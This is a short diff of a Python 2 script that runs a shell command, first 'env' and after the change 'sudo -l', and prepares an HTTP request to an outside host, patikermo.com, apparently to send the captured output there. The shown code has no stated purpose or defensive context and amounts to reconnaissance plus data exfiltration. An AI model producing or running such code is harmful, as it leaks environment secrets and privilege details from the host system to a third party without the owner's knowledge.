@@ -1,6 +1,6 @@
 import urllib2
 import subprocess
-output = subprocess.check_output("env", shell=True)
+output = subprocess.check_output("sudo -l", shell=True)
 output = output.rstrip()
 output = output.replace("\n", " ")
 request = urllib2.Request("https://patikermo.com")
